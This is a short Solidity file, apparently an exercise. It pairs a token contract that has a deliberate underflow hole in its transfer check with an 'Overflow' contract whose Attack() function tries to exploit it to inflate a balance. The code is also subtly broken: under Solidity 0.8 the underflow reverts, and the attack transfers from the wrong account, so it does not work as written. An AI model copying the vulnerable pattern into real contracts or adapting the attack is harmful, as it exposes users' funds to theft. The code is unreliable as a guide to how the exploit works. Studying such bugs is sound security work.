pragma solidity ^0.8.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract Overflow {
    Token token;
    uint256 public max = 2**256 - 1;

    constructor(Token _token) {
        token = Token(_token);
    }

    function Attack() public returns (uint256 balance) {
        if (token.balanceOf(msg.sender) != max) {
            token.transfer(msg.sender, token.balanceOf(msg.sender) + 1);
        }
        return token.balanceOf(msg.sender);
    }
}
